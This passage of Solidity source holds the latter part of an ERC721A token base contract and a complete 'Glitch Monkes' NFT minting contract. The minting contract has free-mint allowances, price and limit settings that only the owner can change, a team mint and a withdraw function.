1010     function setApprovalForAll(address operator, bool approved) public override {
1011         require(operator != _msgSender(), "ERC721A: approve to caller");
1012 
1013         _operatorApprovals[_msgSender()][operator] = approved;
1014         emit ApprovalForAll(_msgSender(), operator, approved);
1015     }
1016 
1017     /**
1018      * @dev See {IERC721-isApprovedForAll}.
1019      */
1020     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1021         return _operatorApprovals[owner][operator];
1022     }
1023 
1024     /**
1025      * @dev See {IERC721-transferFrom}.
1026      */
1027     function transferFrom(
1028         address from,
1029         address to,
1030         uint256 tokenId
1031     ) public virtual override {
1032         _transfer(from, to, tokenId);
1033     }
1034 
1035     /**
1036      * @dev See {IERC721-safeTransferFrom}.
1037      */
1038     function safeTransferFrom(
1039         address from,
1040         address to,
1041         uint256 tokenId
1042     ) public virtual override {
1043         safeTransferFrom(from, to, tokenId, "");
1044     }
1045 
1046     /**
1047      * @dev See {IERC721-safeTransferFrom}.
1048      */
1049     function safeTransferFrom(
1050         address from,
1051         address to,
1052         uint256 tokenId,
1053         bytes memory _data
1054     ) public override {
1055         _transfer(from, to, tokenId);
1056         require(
1057             _checkOnERC721Received(from, to, tokenId, _data),
1058             "ERC721A: transfer to non ERC721Receiver implementer"
1059         );
1060     }
1061 
1062     /**
1063      * @dev Returns whether `tokenId` exists.
1064      *
1065      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1066      *
1067      * Tokens start existing when they are minted (`_mint`),
1068      */
1069     function _exists(uint256 tokenId) internal view returns (bool) {
1070         return tokenId < currentIndex;
1071     }
1072 
1073     function _safeMint(address to, uint256 quantity) internal {
1074         _safeMint(to, quantity, "");
1075     }
1076 
1077     /**
1078      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1079      *
1080      * Requirements:
1081      *
1082      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1083      * - `quantity` must be greater than 0.
1084      *
1085      * Emits a {Transfer} event.
1086      */
1087     function _safeMint(
1088         address to,
1089         uint256 quantity,
1090         bytes memory _data
1091     ) internal {
1092         _mint(to, quantity, _data, true);
1093     }
1094 
1095     /**
1096      * @dev Mints `quantity` tokens and transfers them to `to`.
1097      *
1098      * Requirements:
1099      *
1100      * - `to` cannot be the zero address.
1101      * - `quantity` must be greater than 0.
1102      *
1103      * Emits a {Transfer} event.
1104      */
1105     function _mint(
1106         address to,
1107         uint256 quantity,
1108         bytes memory _data,
1109         bool safe
1110     ) internal {
1111         uint256 startTokenId = currentIndex;
1112         require(to != address(0), "ERC721A: mint to the zero address");
1113         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1114 
1115         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1116 
1117         // Overflows are incredibly unrealistic.
1118         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1119         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1120         unchecked {
1121             _addressData[to].balance += uint128(quantity);
1122             _addressData[to].numberMinted += uint128(quantity);
1123 
1124             _ownerships[startTokenId].addr = to;
1125             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1126 
1127             uint256 updatedIndex = startTokenId;
1128 
1129             for (uint256 i; i < quantity; i++) {
1130                 emit Transfer(address(0), to, updatedIndex);
1131                 if (safe) {
1132                     require(
1133                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1134                         "ERC721A: transfer to non ERC721Receiver implementer"
1135                     );
1136                 }
1137 
1138                 updatedIndex++;
1139             }
1140 
1141             currentIndex = updatedIndex;
1142         }
1143 
1144         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1145     }
1146 
1147     /**
1148      * @dev Transfers `tokenId` from `from` to `to`.
1149      *
1150      * Requirements:
1151      *
1152      * - `to` cannot be the zero address.
1153      * - `tokenId` token must be owned by `from`.
1154      *
1155      * Emits a {Transfer} event.
1156      */
1157     function _transfer(
1158         address from,
1159         address to,
1160         uint256 tokenId
1161     ) private {
1162         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1163 
1164         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1165             getApproved(tokenId) == _msgSender() ||
1166             isApprovedForAll(prevOwnership.addr, _msgSender()));
1167 
1168         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1169 
1170         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1171         require(to != address(0), "ERC721A: transfer to the zero address");
1172 
1173         _beforeTokenTransfers(from, to, tokenId, 1);
1174 
1175         // Clear approvals from the previous owner
1176         _approve(address(0), tokenId, prevOwnership.addr);
1177 
1178         // Underflow of the sender's balance is impossible because we check for
1179         // ownership above and the recipient's balance can't realistically overflow.
1180         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1181         unchecked {
1182             _addressData[from].balance -= 1;
1183             _addressData[to].balance += 1;
1184 
1185             _ownerships[tokenId].addr = to;
1186             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1187 
1188             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1189             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1190             uint256 nextTokenId = tokenId + 1;
1191             if (_ownerships[nextTokenId].addr == address(0)) {
1192                 if (_exists(nextTokenId)) {
1193                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1194                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1195                 }
1196             }
1197         }
1198 
1199         emit Transfer(from, to, tokenId);
1200         _afterTokenTransfers(from, to, tokenId, 1);
1201     }
1202 
1203     /**
1204      * @dev Approve `to` to operate on `tokenId`
1205      *
1206      * Emits a {Approval} event.
1207      */
1208     function _approve(
1209         address to,
1210         uint256 tokenId,
1211         address owner
1212     ) private {
1213         _tokenApprovals[tokenId] = to;
1214         emit Approval(owner, to, tokenId);
1215     }
1216 
1217     /**
1218      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1219      * The call is not executed if the target address is not a contract.
1220      *
1221      * @param from address representing the previous owner of the given token ID
1222      * @param to target address that will receive the tokens
1223      * @param tokenId uint256 ID of the token to be transferred
1224      * @param _data bytes optional data to send along with the call
1225      * @return bool whether the call correctly returned the expected magic value
1226      */
1227     function _checkOnERC721Received(
1228         address from,
1229         address to,
1230         uint256 tokenId,
1231         bytes memory _data
1232     ) private returns (bool) {
1233         if (to.isContract()) {
1234             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1235                 return retval == IERC721Receiver(to).onERC721Received.selector;
1236             } catch (bytes memory reason) {
1237                 if (reason.length == 0) {
1238                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1239                 } else {
1240                     assembly {
1241                         revert(add(32, reason), mload(reason))
1242                     }
1243                 }
1244             }
1245         } else {
1246             return true;
1247         }
1248     }
1249 
1250     /**
1251      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1252      *
1253      * startTokenId - the first token id to be transferred
1254      * quantity - the amount to be transferred
1255      *
1256      * Calling conditions:
1257      *
1258      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1259      * transferred to `to`.
1260      * - When `from` is zero, `tokenId` will be minted for `to`.
1261      */
1262     function _beforeTokenTransfers(
1263         address from,
1264         address to,
1265         uint256 startTokenId,
1266         uint256 quantity
1267     ) internal virtual {}
1268 
1269     /**
1270      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1271      * minting.
1272      *
1273      * startTokenId - the first token id to be transferred
1274      * quantity - the amount to be transferred
1275      *
1276      * Calling conditions:
1277      *
1278      * - when `from` and `to` are both non-zero.
1279      * - `from` and `to` are never both zero.
1280      */
1281     function _afterTokenTransfers(
1282         address from,
1283         address to,
1284         uint256 startTokenId,
1285         uint256 quantity
1286     ) internal virtual {}
1287 }
1288 
1289 contract GlitchMonkes is ERC721A, Ownable, ReentrancyGuard {
1290     string public baseURI = "ipfs:///";
1291     uint   public price             = 0.002 ether;
1292     uint   public maxPerTx          = 10;
1293     uint   public maxPerFree        = 1;
1294     uint   public maxPerWallet      = 20;
1295     uint   public totalFree         = 10000;
1296     uint   public maxSupply         = 10000;
1297     bool   public mintEnabled;
1298     uint   public totalFreeMinted = 0;
1299 
1300     mapping(address => uint256) public _mintedFreeAmount;
1301     mapping(address => uint256) public _totalMintedAmount;
1302 
1303     constructor() ERC721A("Glitch Monkes", "GMONK"){}
1304 
1305     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1306         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1307         string memory currentBaseURI = _baseURI();
1308         return bytes(currentBaseURI).length > 0
1309             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId),".json"))
1310             : "";
1311     }
1312     
1313 
1314     function _startTokenId() internal view virtual returns (uint256) {
1315         return 0;
1316     }
1317 
1318     function PublicMint(uint256 count) external payable {
1319         uint256 cost = price;
1320         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1321             (_mintedFreeAmount[msg.sender] < maxPerFree));
1322 
1323         if (isFree) { 
1324             require(mintEnabled, "Mint is not live yet");
1325             require(totalSupply() + count <= maxSupply, "No more");
1326             require(count <= maxPerTx, "Max per TX reached.");
1327             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1328             {
1329              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1330              _mintedFreeAmount[msg.sender] = maxPerFree;
1331              totalFreeMinted += maxPerFree;
1332             }
1333             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1334             {
1335              require(msg.value >= 0, "Please send the exact ETH amount");
1336              _mintedFreeAmount[msg.sender] += count;
1337              totalFreeMinted += count;
1338             }
1339         }
1340         else{
1341         require(mintEnabled, "Mint is not live yet");
1342         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1343         require(msg.value >= count * cost, "Please send the exact ETH amount");
1344         require(totalSupply() + count <= maxSupply, "No more");
1345         require(count <= maxPerTx, "Max per TX reached.");
1346         require(msg.sender == tx.origin, "The minter is another contract");
1347         }
1348         _totalMintedAmount[msg.sender] += count;
1349         _safeMint(msg.sender, count);
1350     }
1351 
1352     function costCheck() public view returns (uint256) {
1353         return price;
1354     }
1355 
1356     function maxFreePerWallet() public view returns (uint256) {
1357       return maxPerFree;
1358     }
1359 
1360     function _baseURI() internal view virtual override returns (string memory) {
1361         return baseURI;
1362     }
1363 
1364     function setBaseUri(string memory baseuri_) public onlyOwner {
1365         baseURI = baseuri_;
1366     }
1367 
1368     function setPrice(uint256 price_) external onlyOwner {
1369         price = price_;
1370     }
1371 
1372     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1373         totalFree = MaxTotalFree_;
1374     }
1375 
1376      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1377         maxPerFree = MaxPerFree_;
1378     }
1379 
1380     function live() external onlyOwner {
1381       mintEnabled = !mintEnabled;
1382     }
1383     
1384    function TeamMint(uint256 quantity) external onlyOwner {
1385         _safeMint(_msgSender(), quantity);
1386     }
1387 
1388     function withdraw() external onlyOwner nonReentrant {
1389         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1390         require(success, "Transfer failed.");
1391     }
1392 }